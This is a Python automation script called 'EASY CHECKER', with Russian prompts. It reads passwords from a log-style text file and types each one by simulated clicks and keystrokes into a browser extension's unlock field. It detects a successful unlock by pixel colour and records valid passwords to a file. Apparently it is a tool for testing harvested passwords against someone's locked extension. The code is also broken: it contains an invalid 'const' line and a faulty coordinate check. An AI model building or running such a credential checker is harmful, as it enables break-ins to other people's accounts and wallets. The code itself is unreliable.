import pyautogui as pya
from pynput import mouse
from colorama import Fore
from colorama import Style
import keyboard as kb
import re
import time

pos1, pos2, entered, pix = [], [], 0, ''

def get_pos(x, y, btn, pressed):
    global pos1
    global pos2
    global entered
    global pix

    if len(pos1) == 0 and entered == 0: 
        pos1 = [x, y]
        entered = 1
    if len(pos2) == 0 and entered == 0:
        pos2 = [x, y]
        pix = pya.pixel(x, y)
        entered = 1

print(f'''
{Fore.RED}███████╗░█████╗░░██████╗██╗░░░██╗  ░█████╗░██╗░░██╗███████╗██╗░░██╗███████╗██████╗░
██╔════╝██╔══██╗██╔════╝╚██╗░██╔╝  ██╔══██╗██║░░██║██╔════╝██║░██╔╝██╔════╝██╔══██╗
█████╗░░███████║╚█████╗░░╚████╔╝░  ██║░░╚═╝███████║█████╗░░█████═╝░█████╗░░██████╔╝
██╔══╝░░██╔══██║░╚═══██╗░░╚██╔╝░░  ██║░░██╗██╔══██║██╔══╝░░██╔═██╗░██╔══╝░░██╔══██╗
███████╗██║░░██║██████╔╝░░░██║░░░  ╚█████╔╝██║░░██║███████╗██║░╚██╗███████╗██║░░██║
╚══════╝╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░  ░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝{Style.RESET_ALL}''')

file_name = input('Переместите файл в папку со скриптом, напишите сюда его название и нажмите Enter:::')

listener = mouse.Listener(
    on_click = get_pos
)
listener.start()

input('Наведите курсор на поле ввода и кликните левой кнопкой, после нажмите Enter:::')
print(f'[+] Координаты поля: {pos1[0], pos1[1]}')

entered = 0

input('Наведите курсор на поле кнопку ввода и кликните левой кнопкой, после нажмите Enter:::')
print(f'[+] Координаты кнопки: {pos2[0], pos2[1], pix}')

listener.stop()

print('[=============]')
print('[+] У вас есть 5 секунд, что бы открыть расширение и сменить язык на английский')
time.sleep(5)
print('[+] Начинаю чтение файла')

if len(file_name) > 0:
    file_name = file_name.split('.')[0]
    print(f'[+] Название целевого файла: {file_name}')

    try:
         with open(f"{file_name}.txt", "r+") as f:
            parsed = f.read()
            pattern = r"={3,}|\n"
            if len(parsed)>0:
                arr = []
                result = re.split(pattern, parsed)
                for x in result:
                    if(x.strip().startswith('Password')):
                        arr.append(x.split(':', 1)[1].strip())

                if len(arr) > 0: 
                    if len(pos1) == 2 and len(pos2) == 2:
                        for x in arr: 
                            print(f'[+] Ввожу значение {x}')
                            pya.moveTo(pos1[0], pos1[1])
                            pya.click()
                            kb.write(x)
                            pya.moveTo(pos2[0], pos2[1])
                            pya.click()
                            pya.moveTo(pos1[0], pos1[1])
                            pya.click()
                            time.sleep(.5)
                            const is_pix = pya.pixelMatchesColor(pos1[0], pos1[0], (pix[0], pix[0], pix[0]))
                            if is_pix is True: 
                                print(f'[+] {Fore.GREEN}Valid.{Style.RESET_ALL} Пароль {x} валиден')
                                print(f'[+] Записываю валид в файл')
                                try:
                                    with open ('valid.txt', 'a') as v:
                                        v.write(f'[+] Valid: {x}')
                                        print(f'{Fore.GREEN}[+] Изменения успешно записаны в файл{Style.RESET_ALL}')
                                except:
                                    print(f'{Fore.RED}[-] Ошибка при записи файла{Style.RESET_ALL}')
                            else:
                                kb.press('ctrl+a')
                                kb.release('ctrl+a')
                                kb.press('backspace')
                                print('[+] Кнопка нажата. Перезапуск цикла')
                else:
                    print('[-] Произошла ошибка. Не удалось извлечь значения.')
                #print(arr) 
            else:
                print('[-] Файл пуст')
    except FileNotFoundError:
        print(f'[-] Файл {file_name} не найден')
    #except:
    #   print('[-] Произошла ошибка')
